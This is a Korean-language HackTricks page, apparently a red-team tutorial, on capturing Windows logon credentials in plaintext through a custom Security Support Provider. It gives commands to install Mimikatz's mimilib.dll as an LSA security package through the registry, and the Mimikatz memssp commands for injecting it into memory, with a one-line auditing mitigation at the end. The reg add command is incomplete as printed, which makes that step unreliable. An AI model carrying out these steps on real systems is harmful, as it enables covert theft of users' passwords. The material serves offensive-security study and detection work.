# Custom SSP

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

### 사용자 정의 SSP

[SSP (Security Support Provider)가 무엇인지 알아보세요.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
자신의 SSP를 만들어서 기계에 액세스하는 데 사용되는 자격 증명을 **평문으로 캡처**할 수 있습니다.

#### Mimilib

Mimikatz에서 제공하는 `mimilib.dll` 바이너리를 사용할 수 있습니다. **이를 통해 모든 자격 증명이 평문으로 파일에 기록됩니다.**\
dll을 `C:\Windows\System32\`에 드롭하세요.\
기존 LSA 보안 패키지 목록을 가져옵니다:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

보안 지원 공급자 목록 (보안 패키지)에 `mimilib.dll`을 추가합니다:

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

그리고 재부팅 후에 모든 자격 증명은 `C:\Windows\System32\kiwissp.log`에 평문으로 찾을 수 있습니다.

#### 메모리에

또한 Mimikatz를 사용하여 직접 메모리에 주입할 수도 있습니다 (약간 불안정하거나 작동하지 않을 수 있음에 유의하세요):

```powershell
privilege::debug
misc::memssp
```

이것은 재부팅을 견딜 수 없습니다.

#### 완화 방법

이벤트 ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`의 생성/변경 감사 기록

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
